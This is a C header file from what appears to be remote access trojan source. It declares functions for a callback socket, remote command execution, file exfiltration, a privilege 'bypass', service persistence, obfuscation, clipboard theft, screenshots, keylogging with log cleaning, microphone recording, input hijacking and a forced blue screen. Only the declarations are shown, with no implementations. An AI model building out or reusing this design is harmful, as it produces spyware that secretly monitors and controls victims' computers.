#ifndef ALL_H
#define ALL_H

// instead of making a bunch of .h files that only shell.c uses
// here are all the functions for shell.c

#include "main.h"
#include "cry_socket.h"

#include "shell_sendkeys.h"
#include "shell_obf.h"

// shell_service.c
extern BOOL shell_service_start();
extern BOOL shell_service_stop();

// shell_nest.c
extern int shell_service_create();

// shell_sendrecv.c
extern int sendFile(SOCKET mainCallback, const char* filePath);
extern int recvFile(SOCKET mainCallback, const char* filePath);
extern HANDLE sendFile_bg(const char*);
extern HANDLE recvFile_bg(const char*);

// info.c
extern int getPublicIP(char*, int, long unsigned int*);
extern char* getClipboardText();

// shell_run.c
extern int runProc(SOCKET, const char*);
extern int runProc_bg(const char*);
extern int runCMD(SOCKET, const char*);
extern int runCMD_bg(const char*);
extern int bypass(SOCKET, const char*);

// screenshot.c
extern int screenshot(const char*);
extern int screenshot_send(SOCKET);

// shell_admin.c
extern HANDLE admin_msg(const char*);
extern int kill(SOCKET, const char*);
extern int listproc(SOCKET, const char*);
extern HANDLE admin_cm_on();
extern void   admin_cm_off();
extern HANDLE admin_kbd_on();
extern void   admin_kbd_off();
extern HANDLE admin_atk_on();
extern void   admin_atk_off();
extern HANDLE admin_bi_on();
extern void   admin_bi_off();
extern HANDLE admin_bie_on();
extern BOOL   admin_bie_off();
extern HANDLE admin_fmu_on();
extern void   admin_fmu_off();
extern void bsod();

// shell_keylogger.c
extern HANDLE keylog_init(const char*);
extern BOOL keylog_stop();
extern BOOL keylog_clean_get();
extern BOOL keylog_clean_set(BOOL);
extern HANDLE livekeylog_init();
extern BOOL livekeylog_stop();
extern BOOL livekeylog_clean_get();
extern BOOL livekeylog_clean_set(BOOL);

// shell_rec.c
extern DWORD recMic(const char*);
extern HANDLE recMic_bg(const char*);

#endif